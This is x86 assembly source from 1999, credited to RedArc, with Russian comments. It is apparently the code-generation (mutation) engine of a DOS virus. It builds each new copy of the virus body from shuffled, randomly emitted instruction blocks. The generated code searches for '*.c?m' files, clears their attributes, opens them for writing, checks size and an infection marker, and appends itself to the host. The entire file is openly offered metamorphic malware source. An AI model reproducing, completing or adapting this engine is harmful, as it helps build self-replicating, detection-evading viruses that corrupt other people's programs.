;Codegenerator (c) 1999 by RedArc
_Manager:
       call _M@IP
_M@IP:
       pop bp
       add bp,_ManaBeg-3
       push ax
       push ds
       push es
       push cs
       pop ds
       push cs
       pop es
       jmp EntryPointVCG
_ManaBeg equ $-_Manager
       CouMut     db 10
EntryPointVCG:
;Подготавливаем данные
       mov si,bp
       lodsb
       cmp al,0
       je _@0_@
       dec al
       mov di,si
       dec di
       stosb
_@0_@:
       pop es
       pop ds
       pop ax
       push ds
       mov ds,ax
       mov es,ax
       mov cx,di
       mov di,0
       mov ax,di
       cld
_M@1:
       stosb
       loop _M@1
       mov di,BuffBegin
       push di
       mov cx,0
;Формирование новой тушки
       call Jump
       mov byte ptr ds:[di],90h
       inc di
       call _NOP
;Начало большого цикла формирования тушки вируса
_M@Start:
       cmp cx,CouAllBlock
       jl _M@1Start
       jmp EndBlock
_M@1Start:

;Для отладки закомментировать
       mov ah,CouAllBlock+2
       call RND_Tabelle

;Для отладки раскомментировать
;       mov ah,cl

       mov al,ah
       call Get_Flag
       cmp al,0
       jne _M@Start
       mov al,ah
       push cx
Block0:                         ;mov bx,4000
       cmp al,0
       jne Block1
@block0_:
       push ax
       call Cutter1
       mov ax,4000
       mov bl,3
       call _2_MOV16V16
       pop ax
       jmp Cutter2
Block1:                         ;mov ax,4a00h
       cmp al,1
       jne Block2
       call Cutter1
       mov ax,4A00h
       mov bl,0
       call _2_MOV16V16
       mov al,1
       jmp Cutter2
Block2:                         ;int 21h
       cmp al,2
       jne Block3
@block2_:
       push ax
       call Cutter1
       call _INT21h
       pop ax
       jmp Cutter2
Block3:                         ;mov bx,4000
       cmp al,3
       jne Block4
       jmp @block0_
Block4:                         ;mov ax,4800h
       cmp al,4
       jne Block5
@block4_:
       push ax
       call Cutter1
       mov ax,4800h
       mov bl,0
       call _2_MOV16V16
       pop ax
       jmp Cutter2
Block5:                         ;int 21h
       cmp al,5
       jne Block6
       jmp @block2_
Block6:                         ;mov es,ax
       cmp al,6
       jne Block7
       call Cutter1
       mov ax,0c08eh
       stosw
       mov al,6
       jmp Cutter2
Block7:                         ;xchg dx,ax
       cmp al,7
       jne Block8
       call Cutter1
       mov bx,2
       call _2_XCHG16
       mov al,7
       jmp Cutter2
Block8:                         ;mov ax,2600h
       cmp al,8
       jne Block9
       call Cutter1
       mov ax,2600h
       mov bl,0
       call _2_MOV16V16
       mov al,8
       jmp Cutter2
Block9:                         ;int 21h
       cmp al,9
       jne Block10
       push ax
       call Cutter1
       call _INT21h
       pop ax
       jmp Cutter2
Block10:                        ;mov si,100h
       cmp al,10
       jne Block11
@block10_:
       push ax
       call Cutter1
       mov ax,100h
       mov bl,6
       call _2_MOV16V16
       pop ax
       jmp Cutter2
Block11:                         ;push si
       cmp al,11
       jne Block12
       push ax
       call Cutter1
       mov bl,6
       call Push_Reg16_Tabelle
       call _bl
       pop ax
       jmp Cutter2
Block12:                         ;add si,MyLength
       cmp al,12
       jne Block13
@block12_:
       push ax
       call Cutter1
       mov ax,1234h
       mov bl,6
       call Add_Reg16_Value16_Tabelle
       call _ax_bx
       pop ax
       jmp Cutter2
Block13:                         ;add si,1
       cmp al,13
       jne Block14
@block13_:
       push ax
       call Cutter1
       mov ax,1
       mov bl,6
       call _2_ADD16V16
       pop ax
       jmp Cutter2
Block14:                         ;lodsw
       cmp al,14
       jne Block15
@block14_:
       push ax
       call Cutter1
       call Lodsw_Tabelle
       call _bl
       pop ax
       jmp Cutter2
Block15:                         ;mov cx,ax
       cmp al,15
       jne Block16
@block15_:
       push ax
       call Cutter1
       mov bl,1
       mov bh,0
       call _2_MOV16
       pop ax
       jmp Cutter2
Block16:                         ;pop si
       cmp al,16
       jne Block17
@block16_:
       push ax
       call Cutter1
       mov bl,6
       call Pop_Reg16_Tabelle
       call _bl
       pop ax
       jmp Cutter2
Block17:                         ;mov di,si
       cmp al,17
       jne Block18
       call Cutter1
       mov bl,7
       mov bh,6
       call _2_MOV16
       mov al,17
       jmp Cutter2
Block18:                         ;add si,MyLength
       cmp al,18
       jne Block19
       jmp @block12_
Block19:                         ;add si,3
       cmp al,19
       jne Block20
       call Cutter1
       mov ax,3
       mov bl,6
       call _2_ADD16V16
       mov al,19
       jmp Cutter2
Block20:                         ;repe movsb
       cmp al,20
       jne Block21
       call Cutter1
       mov ax,0a4f3h
       stosw
       mov al,20
       jmp Cutter2
Block21:                        ;mov si,100h
       cmp al,21
       jne Block22
       jmp @block10_
Block22:                         ;push es
       cmp al,22
       jne Block23
@block22_:
       push ax
       call Cutter1
       mov ax,6
       stosb
       pop ax
       jmp Cutter2
Block23:                        ;push si
       cmp al,23
       jne Block24
@block11_:
       push ax
       call Cutter1
       mov bl,6
       call Push_Reg16_Tabelle
       call _bl
       pop ax
       jmp Cutter2
Block24:                         ;mov bx,4000
       cmp al,24
       jne Block25
       jmp @block0_
Block25:                         ;mov ax,4800h
       cmp al,25
       jne Block26
       jmp @block4_
Block26:                        ;int 21h
       cmp al,26
       jne Block27
       jmp @block2_
Block27:                        ;mov si,0
       cmp al,27
       jne Block28
       call Cutter1
       mov ax,0h
       mov bl,6
       call _2_MOV16V16
       mov al,27
       jmp Cutter2
Block28:                        ;mov di,BuffBegin
       cmp al,28
       jne Block29
       call Cutter1
       mov ax,BuffBegin
       mov bl,7
       call _2_MOV16V16
       mov al,28
       jmp Cutter2
Block29:                        ;jmp _Manager
       cmp al,29
       jne Block30
       call Cutter1
       mov ax,1234h
       mov bl,3
       call Mov_Reg16_Value16_Tabelle
       call _al_bx
       call _NOP
       mov bl,3
       call Push_Reg16_Tabelle
       call _bl
       mov al,29
       jmp Cutter2 ;!!! Переход на Менеджер
Block30:                        ;mov di,100h
       cmp al,30
       jne Block31
@block30_:
       push ax
       call Cutter1
       mov ax,100h
       mov bl,7
       call _2_MOV16V16
       pop ax
       jmp Cutter2
Block31:                         ;add di,MyLength
       cmp al,31
       jne Block32
@block31_:
       push ax
       call Cutter1
       mov ax,1234h
       mov bl,7
       call Add_Reg16_Value16_Tabelle
       call _ax_bx
       pop ax
       jmp Cutter2
Block32:                         ;add di,3
       cmp al,32
       jne Block33
@block32_:
       push ax
       call Cutter1
       mov ax,3
       mov bl,7
       call _2_ADD16V16
       pop ax
       jmp Cutter2
Block33:                         ;push di
       cmp al,33
       jne Block34
@block33_:
       push ax
       call Cutter1
       mov bl,7
       call Push_Reg16_Tabelle
       call _bl
       pop ax
       jmp Cutter2
Block34:                        ;mov ax,'.*'
       cmp al,34
       jne Block35
       call Cutter1
       mov ax,'.*'
       mov bl,0
       call _2_MOV16V16
       mov al,34
       jmp Cutter2
Block35:                        ;stosw
       cmp al,35
       jne Block36
@block35_:
       push ax
       call Cutter1
       call Stosw_Tabelle
       call _bl
       pop ax
       jmp Cutter2
Block36:                        ;mov ax,'?c'
       cmp al,36
       jne Block37
       call Cutter1
       mov ax,'?c'
       mov bl,0
       call _2_MOV16V16
       mov al,36
       jmp Cutter2
Block37:                         ;stosw
       cmp al,37
       jne Block38
       jmp @block35_
Block38:                        ;mov ax,0006dh
       cmp al,38
       jne Block39
       call Cutter1
       mov ax,0006dh
       mov bl,0
       call _2_MOV16V16
       mov al,38
       jmp Cutter2
Block39:                         ;stosw
       cmp al,39
       jne Block40
       jmp @block35_
Block40:                        ;pop dx
       cmp al,40
       jne Block41
       call Cutter1
       mov bl,2
       call Pop_Reg16_Tabelle
       call _bl
       mov al,40
       jmp Cutter2
Block41:                        ;pop es
       cmp al,41
       jne Block42
@block41_:
       push ax
       call Cutter1
       mov ax,7
       stosb
       pop ax
       jmp Cutter2
Block42:                         ;mov ax,4e00h
       cmp al,42
       jne Block43
       call Cutter1
       mov ax,4E00h
       mov bl,0
       call _2_MOV16V16
       mov al,42
       jmp Cutter2
Block43:                         ;mov cx,0
       cmp al,43
       jne Block44
@block43_:
       push ax
       call Cutter1
       mov ax,0
       mov bl,1
       call _2_MOV16V16
       pop ax
       jmp Cutter2
Block44:                        ;int 21h
       cmp al,44
       jne Block45
       jmp @block2_
Block45:                        ;jnb _@_0 / jmp FreeMem / _@_0: jmp TestFile
       cmp al,45
       jne Block46
       call Cutter1
       mov ax,0373h
       stosw
       call Jump
       call Jump
       mov al,45
       jmp Cutter2
Block46:                         ;mov ax,4900h
       cmp al,46
       jne Block47
       call Cutter1
       mov ax,4900h
       mov bl,0
       call _2_MOV16V16
       mov al,46
       jmp Cutter2
Block47:                        ;int 21h
       cmp al,47
       jne Block48
       jmp @block2_
Block48:                        ;pop si
       cmp al,48
       jne Block49
       jmp @block16_
Block49:                        ;pop es
       cmp al,49
       jne Block50
       jmp @block41_
Block50:                         ;pop ax
       cmp al,50
       jne Block51
@block50_:
       push ax
       call Cutter1
       mov bl,0
       call Pop_Reg16_Tabelle
       call _bl
       pop ax
       jmp Cutter2
Block51:                        ;je _@_1 / jmp AX_0 / _@_1: jmp Int_Next
       cmp al,51
       jne Block52
       call Cutter1
       mov ax,0374h
       stosw
       call Jump
       call Jump
       mov al,51
       jmp Cutter2
Block52:                         ;mov ax,0
       cmp al,52
       jne Block53
@block52_:
       push ax
       call Cutter1
       mov ax,0
       mov bl,0
       call _2_MOV16V16
       pop ax
       jmp Cutter2
Block53:                         ;push ax
       cmp al,53
       jne Block54
@block53_:
       push ax
       call Cutter1
       mov bl,0
       call Push_Reg16_Tabelle
       call _bl
       pop ax
       jmp Cutter2
Block54:                         ;mov dx,es
       cmp al,54
       jne Block55
       call Cutter1
       mov ax,0c28ch
       stosw
       mov al,54
       jmp Cutter2
Block55:                         ;mov ds,dx
       cmp al,55
       jne Block56
       call Cutter1
       mov ax,0da8eh
       stosw
       mov al,55
       jmp Cutter2
Block56:                        ;push es
       cmp al,56
       jne Block57
       jmp @block22_
Block57:                        ;push si
       cmp al,57
       jne Block58
       jmp @block11_
Block58:                         ;retf
       cmp al,58
       jne Block59
       call Cutter1
       call _NOP
       mov al,0cbh
       stosb
       call _NOP
       mov al,58
       jmp Cutter2
Block59:                        ;mov si,9ah
       cmp al,59
       jne Block60
@block59_:
       push ax
       call Cutter1
       mov ax,9ah
       mov bl,6
       call _2_MOV16V16
       pop ax
       jmp Cutter2
Block60:                        ;lodsw
       cmp al,60
       jne Block61
       jmp @block14_
Block61:                         ;cmp ax,1024
       cmp al,61
       jne Block62
       call Cutter1
       mov ax,0003dh
       stosw
       mov al,04
       stosb
       mov al,61
       jmp Cutter2
Block62:                        ;jnb _@_2 / jmp _TF0 / _@_2: jmp _TF1
       cmp al,62
       jne Block63
       call Cutter1
       mov ax,0373h
       stosw
       call Jump
       call Jump
       mov al,62
       jmp Cutter2
Block63:                        ;mov ax,4f00h
       cmp al,63
       jne Block64
       call Cutter1
       mov ax,4F00h
       mov bl,0
       call _2_MOV16V16
       mov al,63
       jmp Cutter2             ;!!! Переход на метку Interrupt
Block64:                         ;cmp ax,1024*40
       cmp al,64
       jne Block65
       call Cutter1
       mov ax,0003dh
       stosw
       mov al,0A0h
       stosb
       mov al,64
       jmp Cutter2
Block65:                        ;jb _@_3 / jmp _TF0 / _@_3: jmp OpenFile
       cmp al,65
       jne Block66
       call Cutter1
       mov ax,0372h
       stosw
       call Jump
       call Jump
       mov al,65
       jmp Cutter2
Block66:                         ;mov dx,9eh
       cmp al,66
       jne Block67
@block66_:
       push ax
       call Cutter1
       mov ax,9eh
       mov bl,2
       call _2_MOV16V16
       pop ax
       jmp Cutter2
Block67:                         ;mov ax,4301h
       cmp al,67
       jne Block68
@block67_:
       push ax
       call Cutter1
       mov ax,4301h
       mov bl,0
       call _2_MOV16V16
       pop ax
       jmp Cutter2
Block68:                        ;mov cx,0
       cmp al,68
       jne Block69
       jmp @block43_
Block69:                        ;int 21h
       cmp al,69
       jne Block70
       jmp @block2_
Block70:                         ;mov ax,3d02h
       cmp al,70
       jne Block71
@block70_:
       push ax
       call Cutter1
       mov ax,3d02h
       mov bl,0
       call _2_MOV16V16
       pop ax
       jmp Cutter2
Block71:                        ;mov dx,9eh
       cmp al,71
       jne Block72
       jmp @block66_
Block72:                        ;int 21h
       cmp al,72
       jne Block73
       jmp @block2_
Block73:                         ;xchg bx,ax
       cmp al,73
       jne Block74
       call Cutter1
       mov bx,3
       call _2_XCHG16
       mov al,73
       jmp Cutter2
Block74:                         ;mov ax,3f00h
       cmp al,74
       jne Block75
@block74_:
       push ax
       call Cutter1
       mov ax,3f00h
       mov bl,0
       call _2_MOV16V16
       pop ax
       jmp Cutter2
Block75:                         ;mov cx,0ffffh
       cmp al,75
       jne Block76
       call Cutter1
       mov ax,0ffffh
       mov bl,1
       call _2_MOV16V16
       mov al,75
       jmp Cutter2
Block76:                        ;mov dx,100h
       cmp al,76
       jne Block77
@block76_:
       push ax
       call Cutter1
       mov ax,100h
       mov bl,2
       call _2_MOV16V16
       pop ax
       jmp Cutter2
Block77:                         ;add dx,MyLength
       cmp al,77
       jne Block78
@block77_:
       push ax
       call Cutter1
       mov ax,1234h
       mov bl,2
       call Add_Reg16_Value16_Tabelle
       call _ax_bx
       pop ax
       jmp Cutter2
Block78:                         ;add dx,3
       cmp al,78
       jne Block79
@block78_:
       push ax
       call Cutter1
       mov ax,3
       mov bl,2
       call Add_Reg16_Value16_Tabelle
       call _ax_bx
       pop ax
       jmp Cutter2
Block79:                         ;push dx
       cmp al,79
       jne Block80
@block79_:
       push ax
       call Cutter1
       mov bl,2
       call Push_Reg16_Tabelle
       call _bl
       pop ax
       jmp Cutter2
Block80:                        ;int 21h
       cmp al,80
       jne Block81
       jmp @block2_
Block81:                         ;pop di
       cmp al,81
       jne Block82
@block81_:
       push ax
       call Cutter1
       mov bl,7
       call Pop_Reg16_Tabelle
       call _bl
       pop ax
       jmp Cutter2
Block82:                         ;sub di,3
       cmp al,82
       jne Block83
       call Cutter1
       mov ax,2
       mov bl,7
       call _2_SUB16V16
       mov al,82
       jmp Cutter2
Block83:                        ;push es
       cmp al,83
       jne Block84
       jmp @block22_
Block84:                         ;push cs
       cmp al,84
       jne Block85
@block84_:
       push ax
       call Cutter1
       mov ax,0eh
       stosb
       pop ax
       jmp Cutter2
Block85:                        ;pop es
       cmp al,85
       jne Block86
       jmp @block41_
Block86:                         ;stosw
       cmp al,86
       jne Block87
       jmp @block35_
Block87:                        ;pop es
       cmp al,87
       jne Block88
       jmp @block41_
Block88:                        ;add di,3
       cmp al,88
       jne Block89
       jmp @block32_
Block89:                         ;xchg di,si
       cmp al,89
       jne Block90
       call Cutter1
       mov bh,6
       mov bl,7
       call _2_XCHG16
       mov al,89
       jmp Cutter2
Block90:                         ;lodsb
       cmp al,90
       jne Block91
@block90_:
       push ax
       call Cutter1
       call Lodsb_Tabelle
       call _bl
       pop ax
       jmp Cutter2
Block91:                         ;cmp al,90h
       cmp al,91
       jne Block92
       call Cutter1
       mov ax,0903ch
       stosw
       mov al,91
       jmp Cutter2
Block92:                        ;je _@_4 / jmp _SaveFile / _@_4: jmp _CloseFile
       cmp al,92
       jne Block93
       call Cutter1
       mov ax,0374h
       stosw
       call Jump
       call Jump
       mov al,92
       jmp Cutter2
Block93:                         ;mov ax,3e00h
       cmp al,93
       jne Block94
@block93_:
       push ax
       call Cutter1
       mov ax,3e00h
       mov bl,0
       call _2_MOV16V16
       pop ax
       jmp Cutter2
Block94:                        ;int 21h
       cmp al,94
       jne Block95
       jmp @block2_
Block95:                        ;mov dx,9eh
       cmp al,95
       jne Block96
       jmp @block66_
Block96:                        ;mov si,95h
       cmp al,96
       jne Block97
       call Cutter1
       mov ax,095h
       mov bl,6
       call _2_MOV16V16
       mov al,96
       jmp Cutter2
Block97:                        ;mov ax,0
       cmp al,97
       jne Block98
       jmp @block52_
Block98:                        ;lodsb
       cmp al,98
       jne Block99
       jmp @block90_
Block99:                        ;mov cx,ax
       cmp al,99
       jne Block100
       jmp @block15_
Block100:                        ;mov ax,4301h
       cmp al,100
       jne Block101
       jmp @block67_
Block101:                        ;int 21h
       cmp al,101
       jne Block102
       push ax
       call Cutter1
       call _INT21h
       pop ax
       jmp Cutter2 ;!!! Переход на метку _TF0
Block102:                         ;mov ax,4200h
       cmp al,102
       jne Block103
@block102_:
       push ax
       call Cutter1
       mov ax,4200h
       mov bl,0
       call _2_MOV16V16
       pop ax
       jmp Cutter2
Block103:                        ;mov cx,0
       cmp al,103
       jne Block104
       jmp @block43_
Block104:                         ;mov dx,0
       cmp al,104
       jne Block105
@block104_:
       push ax
       call Cutter1
       mov ax,0
       mov bl,2
       call _2_MOV16V16
       pop ax
       jmp Cutter2
Block105:                        ;int 21h
       cmp al,105
       jne Block106
       jmp @block2_
Block106:                         ;mov cx,bp
       cmp al,106
       jne Block107
@block106_:
       push ax
       call Cutter1
       mov bl,1
       mov bh,5
       call _2_MOV16
       pop ax
       jmp Cutter2
Block107:                        ;push es
       cmp al,107
       jne Block108
       jmp @block22_
Block108:                         ;pop ds
       cmp al,108
       jne Block109
@block108_:
       push ax
       call Cutter1
       mov ax,1fh
       stosb
       pop ax
       jmp Cutter2
Block109:                        ;mov dx,BuffBegin
       cmp al,109
       jne Block110
       call Cutter1
       mov ax,BuffBegin
       mov bl,2
       call _2_MOV16V16
       mov al,109
       jmp Cutter2
Block110:                         ;mov ax,4000h
       cmp al,110
       jne Block111
@block110_:
       push ax
       call Cutter1
       mov ax,4000h
       mov bl,0
       call _2_MOV16V16
       pop ax
       jmp Cutter2
Block111:                        ;int 21h
       cmp al,111
       jne Block112
       jmp @block2_
Block112:                        ;push cs
       cmp al,112
       jne Block113
       jmp @block84_
Block113:                        ;pop ds
       cmp al,113
       jne Block114
       jmp @block108_
Block114:                        ;mov dx,100h
       cmp al,114
       jne Block115
       jmp @block76_
Block115:                        ;add dx,MyLength
       cmp al,115
       jne Block116
       jmp @block77_
Block116:                         ;mov si,dx
       cmp al,116
       jne Block117
@block116_:
       push ax
       call Cutter1
       mov bl,6
       mov bh,2
       call _2_MOV16
       pop ax
       jmp Cutter2
Block117:                        ;add si,1
       cmp al,117
       jne Block118
       jmp @block13_
Block118:                        ;lodsw
       cmp al,118
       jne Block119
       jmp @block14_
Block119:                        ;mov cx,ax
       cmp al,119
       jne Block120
       jmp @block15_
Block120:                         ;add cx,3
       cmp al,120
       jne Block121
       call Cutter1
       mov ax,3
       mov bl,1
       call _2_ADD16V16
       mov al,120
       jmp Cutter2
Block121:                        ;mov ax,4000h
       cmp al,121
       jne Block122
       jmp @block110_
Block122:                         ;int 21h
       cmp al,122
       jne Block123
       push ax
       call Cutter1
       call _INT21h
       pop ax
       jmp Cutter2 ;!!! Переход на метку _CloseFile
Block123:
       pop cx
       jmp _M@Start
;Завершение формирования тушки
EndBlock:
       mov si,bp
       push di
       push cs
       pop ds
       lodsb
       push es
       pop ds
       cmp al,0
       je _NoMoreMutation
;Дописываем механизм VCG
       push cs
       pop ds
       mov si,bp
       sub si,_ManaBeg
       mov cx,_VCG_Length
       cld
_M@2:
       lodsb
       stosb
       loop _M@2
       push es
       pop ds
       jmp EndStadie
;Формирмируем код, копирующий тушку в буффер как есть
_NoMoreMutation:
       call _CopyAsIsGenerator
;Настройка адресов переходов и констант
EndStadie:
       pop bp
       call _PREPARE_JUMPS
       call _PREPARE_CONST
;Возвращаем длину полученного мутанта
       pop cx
       sub di,cx
       xchg di,cx
;Выход из подпрограммы
       pop ds
       pop ax
       push es
       push ax
       push cs
       pop es
       mov bp,cx
       ret
